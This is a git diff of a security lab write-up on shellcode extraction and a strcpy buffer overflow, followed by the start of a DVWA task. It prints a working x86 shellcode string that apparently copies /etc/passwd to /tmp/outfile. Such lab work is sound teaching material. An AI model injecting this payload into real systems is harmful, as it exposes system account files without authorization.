@@ -93,7 +93,10 @@ Get shell code from complied asm program
 ```
     for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
 ```
-![](./imgs/task1_3.png)
+![](./imgs/task1_3.png) 
+
+<br>
+
 The value that we got
 ```
 \x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80
@@ -108,11 +111,11 @@ Use gdb to find redundant_code function address:
 ![](./imgs/task1_4.png)
 
 ## 3. Stack frame
-stack frame for main fucntion
+stack frame for main fucntion <br>
 ![](./imgs/task1_5.png)
 ## 4. Attack
 
-**Conclusion**: in main fucntion use unsafe function `strcpy`, that lead to attack buffer overflow 
+**Conclusion**: in main fucntion use unsafe function `strcpy`, that lead to attack buffer overflow for attacker inject code, to prevent it, we can use safe function like `strncpy`
 
 # Task 2: Attack on database of DVWA
 - Install dvwa (on host machine or docker container)
